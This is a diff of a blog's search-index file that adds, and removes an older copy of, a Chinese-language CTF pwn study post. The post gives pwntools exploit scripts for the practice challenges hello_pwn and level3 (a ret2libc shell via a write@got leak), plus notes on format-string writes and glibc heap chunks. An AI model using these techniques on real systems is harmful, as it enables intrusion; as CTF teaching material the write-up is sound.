@@ -279,6 +279,85 @@
       </tags>
   </entry>
   <entry>
+    <title>pwn:从一窍不通到入门的门前</title>
+    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
+    <content><![CDATA[<p>基础pwn例题，栈溢出，格式化字符串。</p>
+<span id="more"></span>
+<h3 id="栈溢出例题">栈溢出例题</h3>
+<h4 id="hello-pwn">hello_pwn</h4>
+<p>来源：攻防世界</p>
+<p>首先先checksec：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51X.png" alt=""></p>
+<p>再看伪代码：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51Y.png" alt=""></p>
+<p>再看偏移量：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51Z.png" alt=""></p>
+<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
+<p>exp:</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h4 id="level3">level3</h4>
+<p>来源：攻防世界</p>
+<p>checksec:</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a520.png" alt=""></p>
+<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a521.png" alt=""></p>
+<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
+<p>因此要找到system函数，知识点(搬运自wiki)</p>
+<ul>
+<li>system 函数属于 libc，而 <a href="http://libc.so">libc.so</a> 动态链接库中的函数之间相对偏移是固定的。</li>
+<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
+<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
+</ul>
+<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a522.png" alt=""></p>
+<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a523.png" alt=""></p>
+<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
+<p>exp：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<h3 id="格式化字符串">格式化字符串</h3>
+<p>基本原理以及利用方法在wiki上有解释。</p>
+<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
+<p>主要意思是利用printf一类函数漏洞，当函数没有严格规定格式化字符串时，攻击者可以控制printf函数来输出其他内容，由于格式化字符串输出的是栈上内容，因此此漏洞可以找到栈上其他位置的信息，比如地址，数据。总结一下就是：超出的每一个格式化字符串都能对下一格栈空间造成影响。</p>
+<p>%d:打印成数字，只能泄露栈本身内容</p>
+<p>%x:打印成16进制，只能泄露栈本身内容</p>
+<p>%s:识别栈上内容为指针，打印出该指针指向的位置，这里有可能造成任意地址的泄露（只要能控制栈并完成布局）</p>
+<p>%c:输出字符</p>
+<p>%n:把前面已经打印的长度<strong>写入</strong>某个内存地址(实现任意地址写入)</p>
+<p>%n:写入4个字节，写入1–&gt;0000 0001</p>
+<p>%hn:写入两个字节，写入1–&gt;0001</p>
+<p>%hhn:写入单个字节,写入1–&gt;01</p>
+<h3 id="整数溢出">整数溢出</h3>
+<p>啥都没有，因为懒得搞，搞堆去了</p>
+<p><img src="https://i.niupic.com/images/2022/09/04/a51S.jpg" alt=""></p>
+<h3 id="堆学习">堆学习</h3>
+<p>这里主要是学习了ptmalloc2 – glibc的堆实现和堆利用。</p>
+<h4 id="堆的相关数据结构">堆的相关数据结构</h4>
+<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_chunk</span> &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd;         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd_nextsize; <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+<p>可以看出在一个chunk中有这样几个数据</p>
+<ul>
+<li>prev_size: 如果该 chunk 的**物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）**是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。也就是说，上一个chunk空闲，表示大小，调用，则表示值。</li>
+<li>size：该chunk的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 也就是说64位size是16的整数倍，32位size是8的整数倍，这里就说明无论是32还是64位，size的低三位都一定是0，这样的话在chunk中这三位可以表示其他信息，分别从高到低表示为A，M，P。A表示该chunk是否属于主线程，1表示不属于，0表示属于；M表示记录当前chunk是否由mmap分配；P表示记录<strong>前一个 chunk</strong> 块是否被分配。一般来说，堆中<strong>第一个被分配的内存块的 size 字段的 P 位都会被设置为 1</strong>，以便于防止访问前面的非法内存。**当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。***这也方便进行空闲 chunk 之间的合并。</li>
+<li>fd和bk：fd表示指向下一个空闲的chunk，bk表示指向上一个空闲的chunk，这里要注意的是上下表示的是空闲的顺序而不是地址上的相邻。通过这里两个指针可以让空闲的chunk块加入到chunk块列表统一管理</li>
+<li>fd_nextsize,bk_nextsize：只用chunk空闲才使用，但用于较大的chunk，fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不含bin指针；bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不含bin指针。</li>
+</ul>
+<p>前两个字段称为chunk header,后面的部分称为user data。每次malloc申请得到的内存指针，是指向user data的起始处。</p>
+<p>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。<strong>这就是 chunk 中的空间复用。</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
+<p>被释放的chunk被记录在链表中，具体结构如下：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`head:&#x27; |             Size of chunk, in bytes                     |A|0|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Forward pointer to next chunk in list             |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Back pointer to previous chunk in list            |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Unused space (may be 0 bytes long)                .</span><br><span class="line">        .                                                               .</span><br><span class="line"> next   .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">`foot:&#x27; |             Size of chunk, in bytes                           |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|0|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
+<h4 id="bin是什么">bin是什么</h4>
+<p>首先，用户释放的chunk不会马上归还给系统，ptmalloc会统一管理heap和mmap映射区域中空闲的chunk，用户再次请求分配内存时，ptmalloc会试图在空闲的chunk中挑选一块合适的给用户，可避免频繁地系统调用。ptmalloc会将空闲chunk的大小以及使用状态将chunk分为4类，fast bins, small bins, large bins, unsorted bin。相似大小的chunk会用双向链表链接起来，也就是说每类bin的内部会有多个互不相关的链表来保存不同大小的chunk。</p>
+]]></content>
+      <categories>
+        <category>CTF!</category>
+      </categories>
+      <tags>
+        <tag>基础</tag>
+        <tag>pwn</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>“代码规范”</title>
     <url>/2022/08/02/%E4%BB%A3%E7%A0%81%E8%A7%84%E8%8C%83/</url>
     <content><![CDATA[<p>软件开发代码规范:</p>
@@ -382,99 +461,6 @@
       </tags>
   </entry>
   <entry>
-    <title>函数调用栈</title>
-    <url>/2022/10/14/%E5%87%BD%E6%95%B0%E8%B0%83%E7%94%A8%E6%A0%88/</url>
-    <content><![CDATA[<p>c语言调用函数时栈的情况</p>
-<span id="more"></span>
-<h4 id="函数开始">函数开始</h4>
-<p>如图：</p>
-<p><img src="https://i.niupic.com/images/2022/10/14/a8dM.jpg" alt=""></p>
-<p>当我们开始调用函数时，从最底部开始，第一步是将函数调用的参数传入，顺序是从右至左，在将所有参数push进入栈时。进行指令call func。这里func就是即将调用的函数。每一个call func都可以默认包含两个步骤：push retaddr 和jmp func。传参完毕后会将返回地址Push进入栈中，即图中saved rip的位置，这个retaddr的地址就是call指令下一条指令的地址，目的是为了知道返回而执行下一条指令。进入函数之后该函数会开启一个新的栈帧，默认有三步，第一步push rbp,会将上一个函数的rbp压入栈中，意为保存栈，方便恢复。第二步mov rbp,rsp，会将rsp的值赋给rbp，即将rbp抬高。第三步sub rsp,xxh，为了将rsp减去一定量的字节数，这样就形成了有rsp和rbp包裹的栈结构。</p>
-<h4 id="函数结束">函数结束</h4>
-<p><img src="https://i.niupic.com/images/2022/10/14/a8dM.jpg" alt=""></p>
-<p>首先leave指令可以分解为两个更加基本的指令，第一个是mov rsp,rbp。这一步是为了将rsp变到和rbp同一个位置，第二个指令是pop rbp，弹出rbp。这样就会把储存的上一个函数的rbp弹出，rbp就指向下一个函数了。最后ret指令可以看作pop rip。这个指令会把调用函数时Push的retaddr给弹出，执行流指向下一个指令的地址（即这个retaddr）。</p>
-]]></content>
-  </entry>
-  <entry>
-    <title>pwn:从一窍不通到入门的门前</title>
-    <url>/2022/07/06/pwn-%E4%BB%8E%E4%B8%80%E7%AA%8D%E4%B8%8D%E9%80%9A%E5%88%B0%E5%85%A5%E9%97%A8%E7%9A%84%E9%97%A8%E5%89%8D/</url>
-    <content><![CDATA[<p>基础pwn例题，栈溢出，格式化字符串。</p>
-<span id="more"></span>
-<h3 id="栈溢出例题">栈溢出例题</h3>
-<h4 id="hello-pwn">hello_pwn</h4>
-<p>来源：攻防世界</p>
-<p>首先先checksec：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51X.png" alt=""></p>
-<p>再看伪代码：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51Y.png" alt=""></p>
-<p>再看偏移量：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51Z.png" alt=""></p>
-<p>这里基本就明白了：当dowrd_60106C=1853186401时，执行下面的sub函数，sub函数就直接得出flag了，因此只要再前一步的read函数那里创造栈溢出，再人为满足条件判断即可。</p>
-<p>exp:</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p=process(<span class="string">&#x27;./hello_pwn&#x27;</span>)</span><br><span class="line"><span class="comment">#p=remote(&#x27;111.200.241.244&#x27;,52016)</span></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p64(<span class="number">1853186401</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h4 id="level3">level3</h4>
-<p>来源：攻防世界</p>
-<p>checksec:</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a520.png" alt=""></p>
-<p>32位程序，开启堆栈不可执行，这是一道构造ROP的经典例题。</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a521.png" alt=""></p>
-<p>源码看出漏洞还是栈溢出，但是此时找不到现成的system函数和binsh字符串。</p>
-<p>因此要找到system函数，知识点(搬运自wiki)</p>
-<ul>
-<li>system 函数属于 libc，而 <a href="http://libc.so">libc.so</a> 动态链接库中的函数之间相对偏移是固定的。</li>
-<li>即使程序有 ASLR 保护，也只是针对于地址中间位进行随机，最低的 12 位并不会发生改变。</li>
-<li>查找Libc的网址：<a href="https://libc.blukat.me/">https://libc.blukat.me/</a>和<a href="https://libc.rip/">https://libc.rip/</a></li>
-</ul>
-<p>简单来说：实际的(真实的)地址是需要计算出来的，具体计算方式是：<strong>实际地址=libc偏移量+libc基地址</strong>在已知libc的情况下，我们需要做的就是找到<strong>libc的基址</strong>，而想要找到基址，我们需要知道一个函数的实际地址，本题中关键函数内存在write,read函数，因此想法是使用write函数泄露出write函数的真实地址，而plt表，got表，实际加载地址可以参考下图(搬运自csdn(滑稽))：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a522.png" alt=""></p>
-<p>这样就可以得到基本的思路了: 先构造栈溢出使程序跳到write函数的plt表地址上，此时再次调用main函数或者vulnerable函数再次执行，此时就可以利用write函数打印出write的got表地址，此时需要我们人为的输入write函数的参数。这样就可以得到write函数的真实地址了。栈上的流程大概是这样的（仍然是搬运的(滑天下之大稽）：</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a523.png" alt=""></p>
-<p>这样输出之后我们就得到了write函数的真实地址了，再通过libc来求得system和binsh的真实地址，最后第二次调动程序，再次利用漏洞，就可以得到shell。</p>
-<p>exp：</p>
-<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#p=process(&#x27;./level3&#x27;)</span></span><br><span class="line">p=remote(<span class="string">&#x27;61.147.171.105&#x27;</span>,<span class="number">59245</span>)</span><br><span class="line"></span><br><span class="line">padding=<span class="number">0x88</span></span><br><span class="line"></span><br><span class="line">elf=ELF(<span class="string">&#x27;./level3&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc_32.so.6&#x27;</span>)</span><br><span class="line"></span><br><span class="line">write_plt=elf.plt[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">write_got=elf.got[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">main_addr=elf.sym[<span class="string">&#x27;main&#x27;</span>]</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;a&#x27;</span>*<span class="number">0x88</span>+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(write_plt)+p32(main_addr)+p32(<span class="number">1</span>)+p32(write_got)+p32(<span class="number">0xdeadbeef</span>)</span><br><span class="line"></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">write_got_addr=u32(p.recv()[:<span class="number">4</span>])</span><br><span class="line"><span class="built_in">print</span>(write_got_addr)</span><br><span class="line"></span><br><span class="line">libc_write=libc.sym[<span class="string">&#x27;write&#x27;</span>]</span><br><span class="line">libc_base=write_got_addr-libc_write</span><br><span class="line"></span><br><span class="line">system_addr=libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;the system address is:&#x27;</span>,<span class="built_in">hex</span>(system_addr))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">libc_bin=<span class="built_in">next</span>(libc.search(<span class="string">b&quot;bin/sh&quot;</span>))//找到binsh偏移的方法</span><br><span class="line">bin_addr=libc_base+libc_bin</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;the binsh address is:&quot;</span>,<span class="built_in">hex</span>(bin_addr))</span><br><span class="line"></span><br><span class="line">payload2=<span class="string">b&#x27;a&#x27;</span>*padding+<span class="string">b&#x27;a&#x27;</span>*<span class="number">4</span>+p32(system_addr)+p32(<span class="number">0xdeadbeef</span>)+p32(bin_addr)</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&#x27;:\n&#x27;</span>)</span><br><span class="line">p.sendline(payload2)</span><br><span class="line"></span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
-<h3 id="格式化字符串">格式化字符串</h3>
-<p>基本原理以及利用方法在wiki上有解释。</p>
-<p>&lt;<a href="https://ctf-wiki.org/pwn/linux/user-mode/fmtstr/fmtstr-intro/">原理介绍 - CTF Wiki (ctf-wiki.org)</a>&gt;</p>
-<p>主要意思是利用printf一类函数漏洞，当函数没有严格规定格式化字符串时，攻击者可以控制printf函数来输出其他内容，由于格式化字符串输出的是栈上内容，因此此漏洞可以找到栈上其他位置的信息，比如地址，数据。总结一下就是：超出的每一个格式化字符串都能对下一格栈空间造成影响。</p>
-<p>%d:打印成数字，只能泄露栈本身内容</p>
-<p>%x:打印成16进制，只能泄露栈本身内容</p>
-<p>%s:识别栈上内容为指针，打印出该指针指向的位置，这里有可能造成任意地址的泄露（只要能控制栈并完成布局）</p>
-<p>%c:输出字符</p>
-<p>%n:把前面已经打印的长度<strong>写入</strong>某个内存地址(实现任意地址写入)</p>
-<p>%n:写入4个字节，写入1–&gt;0000 0001</p>
-<p>%hn:写入两个字节，写入1–&gt;0001</p>
-<p>%hhn:写入单个字节,写入1–&gt;01</p>
-<h3 id="整数溢出">整数溢出</h3>
-<p>啥都没有，因为懒得搞，搞堆去了</p>
-<p><img src="https://i.niupic.com/images/2022/09/04/a51S.jpg" alt=""></p>
-<h3 id="堆学习">堆学习</h3>
-<p>这里主要是学习了ptmalloc2 – glibc的堆实现和堆利用。</p>
-<h4 id="堆的相关数据结构">堆的相关数据结构</h4>
-<figure class="highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">  This struct declaration is misleading (but accurate and necessary).</span></span><br><span class="line"><span class="comment">  It declares a &quot;view&quot; into memory allowing access to necessary</span></span><br><span class="line"><span class="comment">  fields at known offsets from a given base. See explanation below.</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">struct</span> <span class="title class_">malloc_chunk</span> &#123;</span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* Size of previous chunk (if free).  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;       <span class="comment">/* Size in bytes, including overhead. */</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd;         <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* fd_nextsize; <span class="comment">/* double links -- used only if free. */</span></span><br><span class="line">  <span class="keyword">struct</span> <span class="title class_">malloc_chunk</span>* bk_nextsize;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
-<p>可以看出在一个chunk中有这样几个数据</p>
-<ul>
-<li>prev_size: 如果该 chunk 的**物理相邻的前一地址 chunk（两个指针的地址差值为前一 chunk 大小）**是空闲的话，那该字段记录的是前一个 chunk 的大小 (包括 chunk 头)。否则，该字段可以用来存储物理相邻的前一个 chunk 的数据。<strong>这里的前一 chunk 指的是较低地址的 chunk</strong> 。也就是说，上一个chunk空闲，表示大小，调用，则表示值。</li>
-<li>size：该chunk的大小，大小必须是 2 * SIZE_SZ 的整数倍。如果申请的内存大小不是 2 * SIZE_SZ 的整数倍，会被转换满足大小的最小的 2 * SIZE_SZ 的倍数。32 位系统中，SIZE_SZ 是 4；64 位系统中，SIZE_SZ 是 8。 也就是说64位size是16的整数倍，32位size是8的整数倍，这里就说明无论是32还是64位，size的低三位都一定是0，这样的话在chunk中这三位可以表示其他信息，分别从高到低表示为A，M，P。A表示该chunk是否属于主线程，1表示不属于，0表示属于；M表示记录当前chunk是否由mmap分配；P表示记录<strong>前一个 chunk</strong> 块是否被分配。一般来说，堆中<strong>第一个被分配的内存块的 size 字段的 P 位都会被设置为 1</strong>，以便于防止访问前面的非法内存。**当一个 chunk 的 size 的 P 位为 0 时，我们能通过 prev_size 字段来获取上一个 chunk 的大小以及地址。***这也方便进行空闲 chunk 之间的合并。</li>
-<li>fd和bk：fd表示指向下一个空闲的chunk，bk表示指向上一个空闲的chunk，这里要注意的是上下表示的是空闲的顺序而不是地址上的相邻。通过这里两个指针可以让空闲的chunk块加入到chunk块列表统一管理</li>
-<li>fd_nextsize,bk_nextsize：只用chunk空闲才使用，但用于较大的chunk，fd_nextsize指向前一个与当前chunk大小不同的第一个空闲块，不含bin指针；bk_nextsize指向后一个与当前chunk大小不同的第一个空闲块，不含bin指针。</li>
-</ul>
-<p>前两个字段称为chunk header,后面的部分称为user data。每次malloc申请得到的内存指针，是指向user data的起始处。</p>
-<p>当一个 chunk 处于使用状态时，它的下一个 chunk 的 prev_size 域无效，所以下一个 chunk 的该部分也可以被当前 chunk 使用。<strong>这就是 chunk 中的空间复用。</strong></p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of previous chunk, if unallocated (P clear)  |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of chunk, in bytes                     |A|M|P|</span><br><span class="line">  mem-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             User data starts here...                          .</span><br><span class="line">        .                                                               .</span><br><span class="line">        .             (malloc_usable_size() bytes)                      .</span><br><span class="line">next    .                                                               |</span><br><span class="line">chunk-&gt; +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             (size of chunk, but used for application data)    |</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br><span class="line">        |             Size of next chunk, in bytes                |A|0|1|</span><br><span class="line">        +-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+-+</span><br></pre></td></tr></table></figure>
-<p>被释放的chunk被记录在链表中，具体结构如下：</p>
